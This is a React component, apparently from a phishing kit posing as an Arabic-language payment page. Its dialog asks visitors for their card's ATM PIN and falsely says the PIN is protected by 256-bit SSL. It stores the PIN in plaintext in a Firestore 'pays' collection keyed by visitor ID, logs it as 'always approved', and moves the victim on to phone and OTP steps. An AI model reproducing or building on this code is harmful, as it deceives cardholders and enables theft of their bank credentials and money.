"use client"

import type React from "react"

import { useState } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldCheck, AlertCircle } from "lucide-react"
import { db} from "@/lib/firebase"
import { doc, updateDoc } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface PinDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onPinSubmitted: () => void
}

export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps) {
  const [pinCode, setPinCode] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (pinCode.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      // Update the document with the PIN
      await updateDoc(doc(db, "pays", visitorID), {
        pinCode,
        pinSubmittedAt: new Date().toISOString(),
        idVerificationStatus: "completed",
        currentStep: "phone",
        otpStatus: "", // Clear otpStatus when moving to phone page
        phoneOtpStatus: "" // Clear phoneOtpStatus as well
      })

      // Add PIN to history (always approved)
      await addToHistory(visitorID, "pin", {
        pinCode
      }, "approved")

      // Success - call the callback
      onPinSubmitted()
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-xl">
            <ShieldCheck className="w-6 h-6 text-[#0a4a68]" />
            الرقم السري للبطاقة (PIN)
          </DialogTitle>
          <DialogDescription>يرجى إدخال الرقم السري الخاص بجهاز الصراف الآلي (ATM)</DialogDescription>
        </DialogHeader>

        <form onSubmit={handlePinSubmit} className="space-y-4">
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          <div className="space-y-2">
            <label className="text-sm font-bold text-gray-900">الرقم السري (PIN)</label>
            <Input
              type="password"
              placeholder="••••"
              value={pinCode}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "").slice(0, 4)
                setPinCode(value)
                setError("")
              }}
              maxLength={4}
              className="h-14 text-center text-3xl font-mono tracking-[1em]"
              dir="ltr"
              disabled={isSubmitting}
              required
            />
          </div>

          <Button
            type="submit"
            className="w-full h-12 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold"
            disabled={pinCode.length !== 4 || isSubmitting}
          >
            {isSubmitting ? "جاري الإرسال..." : "تأكيد الدفع"}
          </Button>

          <div className="flex items-center justify-center gap-2 text-xs text-gray-600">
            <ShieldCheck className="w-4 h-4" />
            <p>الرقم السري محمي بتشفير SSL 256-bit</p>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  )
}
